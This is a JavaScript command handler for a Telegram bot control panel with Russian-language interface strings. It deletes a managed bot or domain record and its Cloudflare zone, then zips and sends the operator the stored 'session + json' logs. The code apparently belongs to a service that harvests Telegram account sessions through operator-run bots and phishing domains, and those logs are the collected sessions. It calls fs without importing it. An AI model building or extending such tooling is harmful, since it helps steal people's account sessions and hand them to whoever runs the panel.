import { bot } from "../../index.js";
import Bot from "../../../database/schemas/bot.js";
import Domain from "../../../database/schemas/domain.js";
import { deleteZone } from "../../../cloudflare/api.js";
import emitter from "../../botDeletor.js";
import log from "../../../database/schemas/log.js";
import { exportLogs } from "../../../utils/index.js";

export default {
    name: "deleteBot",
    async exec(query, [id, confirm]) {

        if (confirm) {
            let x = await Domain.findOneAndDelete({ id })
            console.log(x)
            if (x) {
                await deleteZone(x.zoneId);
            }
            if (!x) x = await Bot.findOneAndDelete({ id });

            emitter.emit('delete', id);

            await bot.editMessageCaption(query, "*✅ Удалено*", {
                message_id: query.message.message_id,
                chat_id: query.message.chat.id,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '🔙 Назад',
                                callback_data: x.zoneId ? 'domains' : 'bots'
                            }
                        ]
                    ]
                }
            });

            let logs = await log.find({ bot: x.token || x.name, exported: false });
            logs = logs
                .filter(log => log.bot !== 'com');

            if (!logs.length) return;

            const path = await exportLogs(logs, `session + json`);
            await bot.sendDocument(query.from.id, path, {
                caption: `*Сессии которые лежали в боте*`,
                parse_mode: 'Markdown'
            });
            fs.rmSync(path.replaceAll(`/sessions_session + json.zip`, ''), {
                force: true,
                recursive: true
            });

            logs.forEach(async _log => {
                await log.findOneAndUpdate({ id: _log.id }, { $set: { exported: true } });
            });

            return;
        }

        const x = await Domain.findOne({ id });
        await bot.editMessageCaption(query, `*❔ Вы точно хотите удалить ${x ? 'домен' : 'бота'}*`, {
            parse_mode: "Markdown",
            message_id: query.message.message_id,
            chat_id: query.message.chat.id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "🗑️ Удалить",
                            callback_data: `deleteBot:${id}:confirm`
                        }
                    ],
                    [
                        {
                            text: '🔙 Назад',
                            callback_data: 'bots'
                        }
                    ]
                ]
            }
        });
    }
}